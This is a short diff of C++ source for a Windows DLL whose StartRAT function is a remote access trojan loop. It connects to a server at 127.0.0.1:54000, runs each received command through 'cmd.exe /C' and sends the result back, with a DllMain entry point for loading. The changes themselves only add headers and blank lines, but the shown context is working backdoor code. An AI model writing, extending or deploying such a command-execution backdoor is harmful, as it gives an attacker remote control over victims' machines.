@@ -1,15 +1,20 @@
 #include <iostream>
 #include <string>
+#include <ctime>
+#include <cstdlib>
 #include "TCPClient.h"
 #include "utils.h"
 
+
 DWORD WINAPI StartRAT(LPVOID lpParam)
 {
+	
 	TCPClient* conn = new TCPClient("127.0.0.1", 54000);
 	conn->start_connection();
 
 	while (true)
 	{
+
 		// recv command from server
 		std::string commandLine = "cmd.exe /C ";
 		commandLine.append(conn->recv_data());
@@ -17,12 +22,13 @@ DWORD WINAPI StartRAT(LPVOID lpParam)
 
 		// send result back to server
 		conn->send_data(result);
+
 	}
 	delete conn;
 
 	return 0;
-
 }
+
 
 BOOL WINAPI DllMain(HINSTANCE dllHandle, DWORD reason_for_call, LPVOID lpvReserved)
 {
